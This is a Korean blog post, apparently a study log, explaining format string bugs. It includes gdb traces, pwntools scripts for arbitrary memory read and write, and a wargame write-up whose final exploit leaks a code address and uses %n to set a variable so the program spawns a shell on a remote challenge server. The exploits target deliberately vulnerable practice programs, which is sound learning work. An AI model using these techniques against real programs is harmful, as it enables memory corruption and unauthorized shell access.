---
layout: post
title: <System Hacking> 19. Format String Bug, Gold4 문제 해결! (2026.05.12 수정)
date: 2022-10-06 10:30:23 +0900
category: System_Hacking
comments: true
---

## Format String에 대하여

> 포맷 스트링(Format String): printf 계열 함수의 첫 번째 인자로 전달되는, %d, %p, %s 등의 포맷 지정자를 포함한 문자열

- %d : 값을 입력하면 10진수를 출력
- %s : 포인터를 입력하면 해당 포인터에 위치하는 null바이트로 끝나는 문자열을 출력
- %x : 값을 입력하면 16진수로 출력
- %p : 포인터를 입력하면 해당 포인터가 가르키는 주소를 출력
- %n : 포인터를 입력하면 지금까지 출력한 바이트수를 포인터가 가르키는 주소에 넣어줌

<br/>

여기서 64비트 포너블을 진행할 때 16진수를 출력하기 위해서 %x보다는 %p를 많이쓰는데, %x는 앞에 0x도 잘 안붙여주고 무조건 4바이트로 출력하기 때문이다. 32비트에서는 크게 문제될 것 없지만, 64비트에서는 8바이트를 출력해주는 %p를 많이 쓴다. (참고로 32비트에서는 %p도 4바이트로 출력해준다.)

<br/>

주로 FSB를 할때는 %n 서식 지정자를 많이 사용하는데, 나머지 서식 지정자들은 전부 인자에 지정된 변수를 '읽어오지만', **%n은 지정된 변수를 읽는 것이 아니라, 지정된 변수에 %n전까지 출력된 문자의 개수를 지정된 변수에 10진수 형식으로 '쓴다'.** 즉, 이를 통해 메모리의 특정 값을 변조할 수 있다.

- %n : 4바이트
- %hn : 2바이트
- %hhn : 1바이트

<br/>

%[n]c라는 표현도 자주쓰는데, **포맷 스트링의 width**라는 개념이다. 이는, 출력의 최소 길이를 지정하고, 출력할 문자의 길이가 최소 길이보다 작으면 그만큼 **패딩 문자를 추가**한다. 예를 들어 %1337c에 대응되는 인자의 길이가 1,337보다 작으면, 인자를 출력하고 남은 길이를 공백으로 출력하는 형식이다. 이를 이용해서, %n으로 원하는 값을 조작해서 넣고 싶을때, 만약 입력 길이에 제한이 있는 프로그램일 경우, width를 사용하면 기하급수적으로 큰 길이도 손쉽게 입력할 수 있게된다.

```c
printf("%10chello"); // [공백 9칸 + 쓰레기값 문자 1개] + "hello"
                     // Why? %c는 문자 하나에 해당하는 인자가 1개 필요하나, 현재 없는 상황
                     // ex) printf("%c", int값);
                     // 인자가 없기 때문에 스택에 있는 임의의 쓰레기값을 가져와서 출력
```

%[n]$s라는 표현도 자주쓰는데, n번째 parameter를 특정 format string으로 처리할 때 사용한다. 특히, FSB에서 자주쓴다.

```c
printf("%2$d",1,2);     // 2 출력
printf("%5$p");         // Format string bug : 8번째 parameter에 해당하는 register 혹은 stack의 주소값 출력
```

## Format String Bug

![FSB]({{site.url}}/img/FSB.png)

위의 그림을 보자. 보통 왼쪽의 형식으로 printf를 사용하지만, 만약 오른쪽의 형식으로 잘못 사용할 경우, printf (혹은 기타 포맷 스트링 사용 함수들)는 기존의 방식대로 값을 참조하기 때문에, **Format string 안에 있는 Format specifier의 개수(%p, %d, %s..)만큼 main 함수의 스택 내용을 임의로 참조**하게 된다. 이를 사용하여 FSB 해킹을 진행하게 된다. printf의 parameter 개수는 Format string specifier 개수로 결정된다.

<br/>

단, 32비트는 parameter를 스택에 push하여 전달하지만, **64비트는 우선 첫 6개의 parameter는 RDI, RSI, RDX, RCX, R8, R9 레지스터로 먼저 전달한 이후에, 7번째부터 스택에 저장하여 전달**하기 때문에, 이를 유의해서 문제를 해결해야한다. 실제로 printf("AAAAAAAA %p %p %p %p %p %p %p %p")라는 입력값을 줄경우, 

```
AAAAAAAA 0x7ffd62e94cf0 0x7f3b4926d8d0 0x1f (nil) (nil) 0x4141414141414141 0x2520702520702520...

RDI = 0x7ffd62e94cf0  ← format string 포인터 (printf가 해석용으로 사용)
RSI = 0x7ffd62e94cf0  ← 1번째 %p 출력 (우연히 RDI와 같은 값)

1번째 %p → RSI = 0x7ffd62e94cf0 (format 버퍼 주소)
2번째 %p → RDX = 0x7f3b4926d8d0
3번째 %p → RCX = 0x1f
4번째 %p → R8  = (nil)
5번째 %p → R9  = (nil)
──────────────────────────── 스택 시작
6번째 %p → 스택 = 0x4141414141414141 ('AAAAAAAA') ← format 버퍼 자기 자신
7번째 %p → 스택 = 0x2520702520702520 (' %p %p ..')
```

이런식으로 출력되고, 7번째부터 스택에 저장된 값이 출력됨을 확인할 수 있다. gdb를 확인해보면 RDI, RSI에는 0x7ffd62e94cf0이 저장되어있다. (참고로 이 주소는 'AAAAAAAA %p %p ....'를 가리키는 주소이다.)

### Example Code (2026.05.12 추가)

더 정확하고 직관적인 이해를 위해 예시 코드로 실습하면서 FSB를 살펴보자.

```c
// gcc fsb_practice.c -o fsb_practice
#include <stdio.h>

int main(){
        char format[0x100];

        printf("Format: ");
        scanf("%[^\n]", format);
        printf(format);

        return 0;
}
```

우선 여기서 `scanf("%[^\n]", format);`라는 낯선 표현이 나온다. 해당 코드는 **`scanf`의 문법 중 하나인 문자 집합 지정자**로, 아래와 같이 사용한다.

```c
// usage : %[집합]
// ^의 역할 : [] 안에서 맨 앞에 ^이 오면 "이 문자들을 제외한" 이라는 의미

%[abc]	// a, b, c 중 하나가 나올 때까지만 읽음
%[a-z]	// 소문자가 나올 때까지만 읽음
%[^\n]	// \n이 아닌 문자들을 읽음
%[^abc]	// a, b, c가 아닌 문자들을 읽음
```

또한, 일반적인 `scanf("%s", buf)`와의 차이점은 다음과 같다.

```c
scanf("%s", buf)     // 공백, 탭, 개행 모두에서 중단
scanf("%[^\n]", buf) // 개행에서만 중단 → 공백 포함해서 읽을 수 있음
```

그래서 "Hello World"처럼 공백이 포함된 문자열을 읽을 때 `%[^\n]`을 사용한다. 

<br/>

이제 이를 토대로 `%p %p %p %p %p %p %p %p %p %p`라는 입력을 주게 되면, FSB가 발생하여 레지스터 및 스택의 값들을 확인할 수 있게 된다. GDB를 통해 확인해보면 보기가 더 좋다.

```sh
   0x5555555551d9 <main+80>     lea    rax, [rbp - 0x110]     RAX => 0x7fffffffdd90 ◂— '%p %p %p %p %p %p %p %p %p %p'
   0x5555555551e0 <main+87>     mov    rdi, rax               RDI => 0x7fffffffdd90 ◂— '%p %p %p %p %p %p %p %p %p %p'
   0x5555555551e3 <main+90>     mov    eax, 0                 EAX => 0
 ► 0x5555555551e8 <main+95>     call   printf@plt                  <printf@plt>
        format: 0x7fffffffdd90 ◂— '%p %p %p %p %p %p %p %p %p %p'
        rsi: 0
        rdx: 0
        rcx: 0
        r8: 0xa
        r9: 0
        arg[6]: 0x7025207025207025 ('%p %p %p')
        arg[7]: 0x2520702520702520 (' %p %p %')
        arg[8]: 0x2070252070252070 ('p %p %p ')
        arg[9]: 0x7025207025
        arg[10]: 0x7fffffffdeb0 —▸ 0x7fffffffdef0 —▸ 0x555555557db0 (__do_global_dtors_aux_fini_array_entry) —▸ 0x555555555140 (__do_global_dtors_aux) ◂— endbr64

   0x5555555551ed <main+100>    mov    eax, 0                       EAX => 0
   0x5555555551f2 <main+105>    mov    rdx, qword ptr [rbp - 8]
   0x5555555551f6 <main+109>    sub    rdx, qword ptr fs:[0x28]
   0x5555555551ff <main+118>    je     main+125                    <main+125>
```

여기서 혼동하면 안되는건, **rdi는 format string 포인터 자체이기 때문에, printf 내부에서 %p를 만났을 때 "다음 인자를 가져와라" 하면 rdi는 이미 소비된 상태이고 rsi부터 시작한다는 것**이다.

```c
printf("%p %p %p", a, b, c);
//      ↑           ↑  ↑  ↑
//     rdi         rsi rdx rcx
//  (포맷 해석용)  (1번째 %p) (2번째 %p) (3번째 %p)
```

이제 해커의 시선으로 보자. 6번째 출력값인 `[rsp]` 부터는 사용자의 입력값을 8글자씩 참조하기 시작하는데, 이를 응용하면 원하는 주소를 넣고 읽거나 쓰는 것이 가능하다.

### Example Code 2 : 임의 주소 읽기 (2026.05.12 추가)

```c
#include <stdio.h>

const char* secret = "THIS IS SECRET";

int main(){
        char format[0x100];

        printf("Address of `secret`: %p\n", secret);
        printf("Format: ");
        scanf("%[^\n]", format);
        printf(format);
        return 0;
}
```

여기서 `secret`의 주소를 처음에 출력해주므로, Payload에 해당 주소를 넣어주고, **`%[n]$s`의 형식으로 스택에 저장된 Payload의 `secret`의 주소를 문자열 형식으로 읽을 수 있다**.

```python
from pwn import *

p = process('./fsb_aar')

p.recvuntil(b'`secret`: ')
secret_addr = int(p.recvline()[:-1].decode(),16)

fstring = b'%7$s'.ljust(8)
fstring += p64(secret_addr)

p.sendline(fstring)
p.interactive()
```

여기서, sendlineafter로 하면 작동을 안하는데, LLM에게 물어보니 다음과 같이 답변했다. 참고하자.

> sendlineafter가 안 됐던 이유는 타이밍 문제였을 가능성이 높습니다. recvline()으로 주소를 읽고 난 직후 Format:  프롬프트가 이미 수신 버퍼에 도착해 있는데, sendlineafter가 그걸 받기 전에 타임아웃이 났거나 내부 버퍼 처리 순서가 꼬인 것입니다.

### Example Code 3 : 임의 주소 쓰기 (2026.05.12 추가)

이 부분이 계속 헷갈리는 부분이라 집중하길 바란다!

```c
#include <stdio.h>

int secret;

int main(){
        char format[0x100];

        printf("Address of `secret`: %p\n", &secret);
        printf("Format: ");
        scanf("%[^\n]", format);
        printf(format);

        printf("Secret: %d", secret);

        return 0;
}
```

우선 `%n`의 사용법과 작동 원리를 간단한 예제부터 응용 예제까지 다루면서 익숙해져야한다.

```c
int count;
printf("Hello%n", &count);
// "Hello" = 5글자 출력
// count = 5

int a;
printf("AA%n", &a);      // a = 2
printf("AAAA%n", &a);    // a = 4
printf("AAAA%1$n", &a);  // a = 4, 1번째 인자에 씀
```

이를 바탕으로, Secret에 내가 원하는 9999이라는 값을 쓰는 코드를 작성해보자.

```python
from pwn import *

p = process('./fsb_aaw')

p.recvuntil(b'`secret`: ')
secret_addr = int(p.recvline()[:-1].decode(),16)

fstring = b'%9999c%8$n'.ljust(16)
fstring += p64(secret_addr)

p.sendline(fstring)
p.interactive()
```

## Format String Bug Gold4 워게임 해결! (2026.05.13 추가)

최근 복습하다보니 FSB 부분의 강의 로드맵에 새로운 문제가 추가되어서 한번 직접 도전해보았다. 난이도가 Gold4로 측정되어있어서, 그동안 풀었던 워게임 문제 중 가장 난이도가 높은 편이라, 솔직히 풀 수 있을거라고 기대를 많이는 안했는데, 끈기있게 고민하다보니 2시간 정도 투자해서 문제를 마침내 풀어냈다..ㅜㅜ 워게임에서 이런 경험은 처음이라 도파민이 엄청 터진다!

### Write-up

```c
// Name: fsb_overwrite.c
// Compile: gcc -o fsb_overwrite fsb_overwrite.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void get_string(char *buf, size_t size) {
  ssize_t i = read(0, buf, size);
  if (i == -1) {
    perror("read");
    exit(1);
  }
  if (i < size) {
    if (i > 0 && buf[i - 1] == '\n') i--;
    buf[i] = 0;
  }
}

int changeme;

int main() {
  char buf[0x20];

  setbuf(stdout, NULL);

  while (1) {
    get_string(buf, 0x20);
    printf(buf);
    puts("");
    if (changeme == 1337) {
      system("/bin/sh");
    }
  }
}
```

문제의 코드이고, 보안 기법은 Canary를 제외하고는 모두 적용되어있다. 일단 처음에 든 생각은, 'FSB를 이용하는건 알겠는데, `get_string` 함수의 용도가 뭐지..?' 였다. 사실 저 함수의 의도 파악에 제일 시간을 많이 보낸것같다. 뭔가 저 코드를 이용해야 되는 것인가..? 싶어서 한참 고민했다.

<br/>

그러다가 문득, 오히려 저 `if (i < size)` 조건문에 걸리지 않도록 설계해야됨을 직감했다. 저 조건문에 걸리는 순간 내가 보내는 Payload가 0으로 오염됨을 깨달았다. 아, 그러면 고정적으로 0x20 길이의 Payload를 유지해서 보내야되는구나..

<br/>

그 외에, 또 한참을 고민했다. `changeme` 전역변수를 1337로 바꿔야하는데, `buf` 에서 OOB 취약점을 이용해서 접근해야하나? 싶어서 GDB로 둘의 주소를 확인해보니 접근은 커녕 너무 멀리 떨어져있어서 그런 의도로 푸는게 아님을 깨닫고 바로 포기.

<br/>

그러다가, **`main` 함수와 `changeme` 전역변수의 주소가 되게 가까움을 발견, 둘의 주소 차를 계산해보니 항상 `0x2d89` 였다!** 

```bash
pwndbg> i var changeme
All variables matching regular expression "changeme":

Non-debugging symbols:
0x000055555555801c  changeme

pwndbg> print main
$1 = {<text variable, no debug info>} 0x555555555293 <main>

pwndbg> print 0x000055555555801c - 0x555555555293
$2 = 0x2d89
```

그렇다면, `main` 함수의 Base address만 구할 수 있다면 해결할 수 있을 것 같았다. 그래서, **Stack을 자세히 살펴보니, 늘 평소에만 보던 `x/10gx $rsp` 근처를 좀 더 벗어나서 내려서 보니, 딱 `main` 함수의 Base address가 존재하는 걸 발견**했다. 아, FSB를 이용해서 저기를 접근하면 되는구나!

```bash
pwndbg> x/20gx $rsp
0x7fffffffde70: 0x0000000000000000      0x0000000000000000
0x7fffffffde80: 0x0000000000000000      0x00007ffff7fe5af0
0x7fffffffde90: 0x00007fffffffdf80      0xb35a7763b380ee00
0x7fffffffdea0: 0x00007fffffffdf40      0x00007ffff7c2a1ca
0x7fffffffdeb0: 0x00007fffffffdef0      0x00007fffffffdfc8
0x7fffffffdec0: 0x0000000155554040      0x0000555555555293 <- 이거
0x7fffffffded0: 0x00007fffffffdfc8      0x6413e45c58c6e4d3
0x7fffffffdee0: 0x0000000000000001      0x0000000000000000
0x7fffffffdef0: 0x0000555555557d90      0x00007ffff7ffd000
0x7fffffffdf00: 0x6413e45c5b26e4d3      0x6413f426a544e4d3
```

하지만 앞서 FSB를 실습할때는 아무리 많아도 10번째 인자 정도까지만 접근했던 터라, 몇번째 인자로 접근해야 스택의 저 주소에 접근할 수 있는지 감이 안와서 아래처럼 막 다양한 인자들을 Heuristic하게 출력해보기 시작했다.

```python
payload = b'AAAAAAAA %6$p %7$p %8$p %9$p %10$p'.ljust(0x20)
# Output : b'AAAAAAAA 0x4141414141414141 0x3725207024362520 0x2070243825207024 0x3031252070243925 %10\n'
```

그러다가, 내 Local 환경 기준으로, **17번째 인자인 `[rsp+0x58]` 에 저 주소가 존재함**을 확인했고, **반복문으로 계속 Payload를 보낼 수 있으므로, 저렇게 출력한 주소를 다시 Payload에 심는 방법**을 이용해서 Payload를 구성하기 시작했다!

```python
payload = b'%17$p'.ljust(0x20)
# Output : b'0x555555555293                            \xc7\n'

changeme_addr에 해당 주소 저장
```

처음에는 그냥 6번째 인자인 `[rsp]` 에 `changeme` 주소를 넣고, 그 뒤에 이어서 6번째 인자에 1337 값을 쓰는 `%1337c%6$n` 으로 구성하면 되겠지? 싶어서 다음처럼 Payload를 구성했더니 실패했다.

```python
payload = (p64(changeme_addr) + b'%1337c%6$n').ljust(0x20)
```

GDB로 디버깅해보니, `changeme` 에 값이 안쓰이고 있었고, 지난 FSB 이론을 복습해보니, **둘의 Payload 순서를 바꾸고 Padding도 제대로 신경써서 넣어야 한다는 것**을 깨달았다.

```sh
   0x565f7a8102fe <main+107>  ✔ jne    main+47                     <main+47>
    ↓
   0x565f7a8102c2 <main+47>     lea    rax, [rbp - 0x30]                 RAX => 0x7ffe43325e90 ◂— 0x2020207024373125 ('%17$p   ')
   0x565f7a8102c6 <main+51>     mov    esi, 0x20                         ESI => 0x20
   0x565f7a8102cb <main+56>     mov    rdi, rax                          RDI => 0x7ffe43325e90 ◂— 0x2020207024373125 ('%17$p   ')
   0x565f7a8102ce <main+59>     call   get_string                  <get_string>

 ► 0x565f7a8102d3 <main+64>     lea    rax, [rbp - 0x30]     RAX => 0x7ffe43325e90 —▸ 0x565f7a81301c (changeme) ◂— 0
   0x565f7a8102d7 <main+68>     mov    rdi, rax              RDI => 0x7ffe43325e90 —▸ 0x565f7a81301c (changeme) ◂— 0
   0x565f7a8102da <main+71>     mov    eax, 0                EAX => 0
   0x565f7a8102df <main+76>     call   printf@plt                  <printf@plt>

   0x565f7a8102e4 <main+81>     lea    rax, [rip + 0xd1e]     RAX => 0x565f7a811009 ◂— 0x68732f6e69622f00
   0x565f7a8102eb <main+88>     mov    rdi, rax               RDI => 0x565f7a811009 ◂— 0x68732f6e69622f00
────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────
00:0000│ rsi rsp 0x7ffe43325e90 —▸ 0x565f7a81301c (changeme) ◂— 0
01:0008│-028     0x7ffe43325e98 ◂— 0x3625633733333125 ('%1337c%6')
02:0010│-020     0x7ffe43325ea0 ◂— 0x2020202020206e24 ('$n      ')
03:0018│-018     0x7ffe43325ea8 ◂— 0x2020202020202020 ('        ')
04:0020│-010     0x7ffe43325eb0 —▸ 0x7ffe43325fa0 —▸ 0x565f7a810120 (_start) ◂— endbr64
05:0028│-008     0x7ffe43325eb8 ◂— 0x432492b51ea8dd00
06:0030│ rbp     0x7ffe43325ec0 —▸ 0x7ffe43325f60 —▸ 0x7ffe43325fc0 ◂— 0
07:0038│+008     0x7ffe43325ec8 —▸ 0x769d3542a1ca (__libc_start_call_main+122) ◂— mov edi, eax
```

### 최종 코드

```python
from pwn import *

#p = process('./fsb_overwrite')
p = remote('host8.dreamhack.games', 9509)
#pause()
# payload = b'AAAAAAAA %6$p %7$p %8$p %9$p %10$p'.ljust(0x20)
payload = b'%15$p'.ljust(0x20) # Local은 17번째, Server는 15번째에 존재

p.send(payload)
data = p.recvline()
print(data)

main_base_addr = int(data.split()[0].decode(), 16)
print(hex(main_base_addr))

changeme_addr = main_base_addr + 0x2d89

payload = b'%1337c%8$n'.ljust(0x10)
payload += p64(changeme_addr).ljust(0x10)

p.send(payload)
data = p.recvline()
print(data)

p.interactive()
```

참고로, Local과 Dreamhack Server의 환경의 차이로 인해 Stack 구성이 약간 차이가 있어서, 15번째 인자로 접근하도록 코드를 수정했더니 정상 동작함을 확인했다!

## 마치며

최대한 정답을 안보고, 내 힘으로 직접 Payload를 짜고, 실습 문제들도 대충 넘어가지 않고 하나하나 풀어보고 검토해보는 연습을 하다보니, 포너블의 기초가 제법 탄탄해지고 자신감이 조금씩 생김을 느꼈다. 사실 예전에 1회차때는 직접 문제를 푸는 것은 자신이 없었는데, 이제는 복습 후에 워게임을 자신있게 도전할 용기가 생긴다.
